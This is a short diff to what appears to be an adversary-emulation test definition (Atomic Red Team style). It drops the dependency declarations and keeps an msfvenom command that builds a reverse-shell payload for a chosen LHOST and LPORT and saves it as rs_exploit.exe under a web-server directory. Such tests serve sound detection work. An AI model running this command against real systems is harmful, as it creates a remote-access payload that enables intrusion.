@@ -29,10 +29,6 @@ atomic_tests:
       description: output_path
       type: String
       default: /var/www/html/rs_exploit.exe
-  dependency_executor_name: bash
-  dependencies:
-  - description: |
-      msfvenom must be installed & accessed
   executor:
     command: |
       msfvenom -p #{payload} LHOST=#{LHOST} LPORT=#{LPORT} -f #{format} -o #{output_path}
@@ -62,7 +58,6 @@ atomic_tests:
       description: LPORT
       type: String
       default: 4444
-  dependency_executor_name: bash
   executor:
     command: |
       cat << EOF
